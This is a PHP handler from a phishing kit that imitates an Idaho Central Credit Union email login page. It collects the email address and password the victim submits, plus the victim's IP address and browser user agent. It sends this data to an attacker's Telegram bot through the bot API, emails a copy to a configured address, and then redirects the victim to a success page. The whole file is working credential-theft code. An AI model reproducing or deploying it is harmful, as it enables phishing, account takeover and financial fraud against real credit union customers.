<?php

include 'config.php';
include 'ip.php';


$message .= "----- Idaho Central Credit Union Email Login 2| $ip---------#\r\n";
$message .= "Email'ID          	: ".$_POST['email-id']."\n";
$message .= "Password           	: ".$_POST['email-password']."\n";
$message .= "|---https://ip-api.com/#$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|Client IP: ".$ip."\n";

$website="https://api.telegram.org/bot".$botToken;

  $params=[
      'chat_id'=>$chatId,
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);


$subject="Idaho Central Credit Union Email Login Info 2";
mail($to, $subject, $message);

header('Location:../success.php');
exit();
